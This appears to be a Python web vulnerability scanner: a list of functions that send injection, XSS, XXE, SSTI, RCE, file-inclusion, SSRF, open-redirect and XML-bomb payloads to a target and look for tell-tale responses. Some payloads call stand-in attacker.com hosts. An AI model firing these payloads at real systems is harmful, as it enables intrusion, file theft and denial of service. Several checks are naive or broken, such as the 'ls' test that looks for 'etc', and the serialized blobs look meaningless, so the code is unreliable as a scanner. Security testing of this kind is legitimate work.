import requests

### Injection flows ###
def is_sql_injection_check(url):
     # Check for SQL injection vulnerability
    payload = "1' OR '1'='1"
    response = requests.get(url + "/products?id=" + payload)
    if "error" in response.text:
        print("SQL Injection Vulnerability Detected!")
        return True
    return False


def is_command_injection_vulnerable(url):
    payload = "127.0.0.1; ls"
    response = requests.get(url + "/ping?host=" + payload)
    if "etc" in response.text:
        print("Command Injection Vulnerability Detected!")
        return True
    return False


def is_xss_vulnerable(url):
    payload = "<script>alert('XSS')</script>"
    response = requests.post(url, data={"input": payload})
    if payload in response.text:
        print("XSS Vulnerability Detected!")
        return True
    return False


def is_stored_xss_vulnerable(url):
    payload = "<script>alert('XSS')</script>"
    response = requests.post(url, data={"comment": payload})
    if payload in response.text:
        print("Stored XSS Vulnerability Detected!")
        return True
    return False

def is_dom_based_xss_vulnerable(url):
    payload = "<script>document.write(document.domain)</script>"
    response = requests.post(url, data={"input": payload})
    if payload in response.text:
        print("DOM-based XSS Vulnerability Detected!")
        return True
    return False


def check_xss_via_svg(url):
    payload = '''
    <svg xmlns="http://www.w3.org/2000/svg">
    <script>alert('XSS')</script>
    </svg>
    '''
    response = requests.post(url, data={"input": payload})
    if payload in response.text:
        print("XSS via SVG Vulnerability Detected!")
        return True
    return False

def check_sql_injection_union(url):
    payload = "1' UNION SELECT null,version(),user()--"
    response = requests.get(url + "/products?id=" + payload)
    if "error" in response.text:
        print("SQL Injection via UNION-based Attack Vulnerability Detected!")
        return True
    return False


def check_xss_html_injection(url):
    payload = "<script>alert('XSS')</script>"
    response = requests.post(url, data={"input": payload})
    if payload in response.text:
        print("XSS via HTML Injection Vulnerability Detected!")
        return True
    return False


def check_xss_javascript_execution(url):
    payload = "<img src=x onerror=alert('XSS')>"
    response = requests.post(url, data={"input": payload})
    if payload in response.text:
        print("XSS via JavaScript Execution Vulnerability Detected!")
        return True
    return False


###########
def is_xxe_vulnerable(url):
    payload = "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
    headers = {'Content-Type': 'application/xml'}  # Setting Content-Type as application/xml for XML payload
    response = requests.post(url, data=payload, headers=headers)
    if "root:x" in response.text:
        print("XML External Entity (XXE) Vulnerability Detected!")
        return True
    return False
#################

def is_ssti_vulnerable(url):
    payload = "{{7*'7'}}"
    response = requests.post(url, data={"template": payload})
    if "49" in response.text:
        print("Server-Side Template Injection (SSTI) Vulnerability Detected!")
        return True
    return False


def is_ssti_templating_vulnerable(url):
    payload = "{{ ''.__class__.__mro__[1].__subclasses__()[80]('id') }}"
    response = requests.post(url, data={"template": payload})
    if "uid" in response.text:
        print("Server-Side Template Injection (SSTI) Vulnerability Detected for Specific Templating Engine!")
        return True
    return False


####### Remote Code Execution (RCE) #########

def is_rce_vulnerable(url):
    payload = "'; system('id'); //"
    response = requests.get(url + "/command?cmd=" + payload)
    if "uid" in response.text:
        print("Remote Code Execution Vulnerability Detected!")
        return True
    return False


def is_rce_eval_vulnerable(url):
    payload = "eval('_import_(\\'os\\').popen(\\'id\\').read()')"
    response = requests.post(url, data={"input": payload})
    if "uid" in response.text:
        print("RCE via eval Vulnerability Detected!")
        return True
    return False


def check_rce_deserialization(url):
    payload = "gAN9cQAoWAUAAABkYXRhYmFzZXF0eXBlCnEAXgAAAGV4aXQoKVgFAAAAaW5jbHVkaW5nCnEARgBAAAAAA=="
    response = requests.post(url, data=payload)
    if "RCE Successful" in response.text:
        print("RCE via Deserialization Vulnerability Detected!")
        return True
    return False

def check_ssrf_via_ssti(url):
    payload = "{{config._class.__init__.__globals_['os'].popen('id').read()}}"
    response = requests.post(url, data={"template": payload})
    if "uid" in response.text:
        print("SSRF via SSTI Vulnerability Detected!")
        return True
    return False


def check_ssrf_via_xxe(url):
    payload = '''<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [<!ENTITY % remote SYSTEM "http://internal-server.local"> %remote;]>
    <root></root>
    '''
    response = requests.post(url, data=payload)
    if "Internal Resource Contents" in response.text:
        print("SSRF via XXE Vulnerability Detected!")
        return True
    return False




######### File Inclusion and Directory Traversal #########


def is_remote_file_inclusion_vulnerable(url):
    payload = "http://attacker.com/malicious_script.php"
    response = requests.get(url + "/file?file=" + payload)
    if "Attacker's Content" in response.text:
        print("Remote File Inclusion Vulnerability Detected!")
        return True
    return False


def is_rci_vulnerable(url):
    payload = "https://attacker.com/malicious_script.php"
    response = requests.get(url + "?file=" + payload)
    if "Attacker's Code Executed" in response.text:
        print("Remote Code Inclusion (RCI) Vulnerability Detected!")
        return True
    return False


def check_lfi(url):
    file_path = "/etc/passwd"
    payload = f"../../../../../../..{file_path}"
    response = requests.get(url + "?file=" + payload)
    if "root:x:0:0" in response.text:
        print("LFI Vulnerability Detected!")
        return True
    return False



###########  Forgery and Hijacking ###########

def is_csrf_vulnerable(url):
    response = requests.post(url, data={"action": "delete", "id": "123"})
    if "Action Successful" in response.text:
        print("CSRF Vulnerability Detected!")
        return True
    return False


def is_xssi_vulnerable(url):
    payload = "https://www.attacker.com/xssi.js"
    response = requests.get(url + "/xssi?file=" + payload)
    if "Sensitive Information" in response.text:
        print("Cross-Site Script Inclusion Vulnerability Detected!")
        return True
    return False


def is_xssi_jsonp_vulnerable(url):
    payload = "<script src='https://attacker.com/xssi.js'></script>"
    response = requests.get(url + "/data?callback=" + payload)
    if "Sensitive Information" in response.text:
        print("XSSI via JSONP Vulnerability Detected!")
        return True
    return False


def check_csrf_via_flash(url):
    payload = '''
        <!DOCTYPE html>
        <html>
        <body>
            <h1>CSRF via Flash</h1>
            <object data="https://attacker.com/flash.swf"></object>
        </body>
        </html>
        '''
    response = requests.post(url, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"})
    if "Unauthorized Action Performed" in response.text:
        print("CSRF via Flash Vulnerability Detected!")
        return True
    return False


def check_websocket_hijacking(url):
    payload = "wss://attacker.com"
    response = requests.get(url + "/ws?endpoint=" + payload)
    if "Attacker's WebSocket Connection" in response.text:
        print("Insecure WebSocket Hijacking Vulnerability Detected!")
        return True
    return False



############ Server-Side Request Forgery (SSRF) ############

def is_ssrf_vulnerable(url):
    payload = "http://localhost/admin"
    response = requests.get(url + "/fetch?url=" + payload)
    if "Sensitive Admin Page" in response.text:
        print("SSRF Vulnerability Detected!")
        return True
    return False


def is_ssrf_dns_rebinding_vulnerable(url):
    payload = "http://internal-server.local"
    response = requests.get(url + "/api?endpoint=" + payload)
    if "Internal Resource Contents" in response.text:
        print("Server-Side Request Forgery (SSRF) via DNS Rebinding Vulnerability Detected!")
        return True
    return False


############  Misconfiguration and Insecure Design ############

def is_security_misconfiguration_vulnerable(url):
    response = requests.get(url + "/admin")
    if response.status_code == 200 and "Default Credentials" in response.text:
        print("Security Misconfiguration Vulnerability Detected!")
        return True
    return False


def is_insecure_cors_configured(url):
    response = requests.get(url)
    if response.headers.get("Access-Control-Allow-Credentials", "") == "true":
        print("Insecure Cross-Origin Resource Sharing (CORS) Configuration Detected!")
        return True
    return False


def check_cors_misconfiguration(url):
    response = requests.get(url)
    if response.headers.get("Access-Control-Allow-Origin", "") == "*":
        print("CORS Misconfiguration Detected!")
        return True
    return False


def is_csp_bypass_vulnerable(url):
    response = requests.get(url)
    if "unsafe-inline" in response.headers.get("Content-Security-Policy", ""):
        print("Content Security Policy (CSP) Bypass Vulnerability Detected!")
        return True
    return False


def check_security_headers(url):
    response = requests.get(url)
    if "Content-Security-Policy" not in response.headers:
        print("Security Headers Misconfiguration Detected!")
        return True
    return False


def check_transport_layer_protection(url):
    response = requests.get(url)
    if "Password Input Form" in response.text and "https://" not in response.text:
        print("Insufficient Transport Layer Protection Vulnerability Detected!")
        return True
    return False


########### Redirection and Header Injection ###########

def is_unvalidated_redirect_vulnerable(url):
    payload = "https://www.attacker.com"
    response = requests.get(url + "/redirect?to=" + payload)
    if "example.com" not in response.url:
        print("Unvalidated Redirect Vulnerability Detected!")
        return True
    return False


def check_open_redirect(url):
    payload = "https://www.attacker.com"
    response = requests.get(url + "?redirect=" + payload)
    if "example.com" not in response.url:
        print("Open Redirect Vulnerability Detected!")
        return True
    return False


def check_open_redirect_via_data_url(url):
    payload = "data:text/html;base64,PHNjcmlwdD5hbGVydCgnSFRUUCBXSVRIIFJFUE9SVCcpPC9zY3JpcHQ+"
    response = requests.get(url + "?redirect=" + payload)
    if "example.com" not in response.url:
        print("Open Redirect via data URL Vulnerability Detected!")
        return True
    return False


########### Parameter Tampering ###########

def check_http_parameter_pollution(url):
    payload = {"param": "value1", "param": "value2"}
    response = requests.get(url, params=payload)
    if response.status_code == 200 and "Data Corruption Detected" in response.text:
        print("HTTP Parameter Pollution Vulnerability Detected!")
        return True
    return False

########### Denial of Service (DoS) ###########

def check_xml_bomb_dos(url):
    payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE bomb [<!ENTITY a "&#x26;#x41;"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;"><!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;"><!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;"><!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;"><!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;"><!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;"><!ENTITY k "&j;&j;&j;&j;&j;&j;&j;&j;&j;&j;"><!ENTITY l "&k;&k;&k;&k;&k;&k;&k;&k;&k;&k;"><!ENTITY m "&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;"><!ENTITY n "&m;&m;&m;&m;&m;&m;&m;&m;&m;&m;"><!ENTITY o "&n;&n;&n;&n;&n;&n;&n;&n;&n;&n;"><!ENTITY p "&o;&o;&o;&o;&o;&o;&o;&o;&o;&o;"><!ENTITY q "&p;&p;&p;&p;&p;&p;&p;&p;&p;&p;"><!ENTITY r "&q;&q;&q;&q;&q;&q;&q;&q;&q;&q;"><!ENTITY s "&r;&r;&r;&r;&r;&r;&r;&r;&r;&r;"><!ENTITY t "&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;"><!ENTITY u "&t;&t;&t;&t;&t;&t;&t;&t;&t;&t;"><!ENTITY v "&u;&u;&u;&u;&u;&u;&u;&u;&u;&u;"><!ENTITY w "&v;&v;&v;&v;&v;&v;&v;&v;&v;&v;"><!ENTITY x "&w;&w;&w;&w;&w;&w;&w;&w;&w;&w;"><!ENTITY y "&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;"><!ENTITY z "&y;&y;&y;&y;&y;&y;&y;&y;&y;&y;">]><root>&z;</root>'
    # The actual payload should contain a large number of nested entities to be a bomb.
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print("Server-Side DoS via XML Bomb Vulnerability Detected!")
        return True
    return False

########## Deserialization Flaws ##########

def is_insecure_deserialization_vulnerable(url):
    payload = "gAN9cQBYAQAAAGV4ZWN1dGlvbl90aW1lcXVhbGl0eQFyBAAAAHRpbWVvdXQKWAUAAABleGVjdXRpb25faWQKcQFXAQAAAGlkcQJYBAAAAGFjdGl2ZV9pZApxAkcBAAAAZGF0YXRhYmluZC5jb21fXwBWAUAAAHRpbWUKcQ1SAAAAZGF0YXRhYmluZC5jb21fXwFeAQAAD3N0cmluZ19mcm9udF90aW1lCnFhSgAAAHZhbHVlCnEKSgMAAAByZWxlYXNlCnEKVgUAAABpZApxCUQCAAAAZGF0YXRhYmluZC5jb21fXwBWAUAAAHRpbWUKcQhLAwAAAHN0cmluZ19mcm9udF90aW1lCnEKYUsCAAAAdmFsdWUKcQpSAAAAZGF0YXRhYmluZC5jb21fXwFeAQAAD3N0cmluZ19mcm9udF90aW1lCnFRawAAAA=="
    response = requests.post(url, data=payload)
    if "Insecure Deserialization Detected!" in response.text:
        print("Insecure Deserialization Vulnerability Detected!")
        return True
    return False


######## File Upload Flaws #########

def is_file_upload_vulnerable(url):
    file_content = b"<html><body><h1>Uploaded File</h1></body></html>"
    files = {"file": ("uploaded.html", file_content)}
    response = requests.post(url, files=files)
    if "Upload Successful" in response.text:
        print("File Upload Vulnerability Detected!")
        return True
    return False

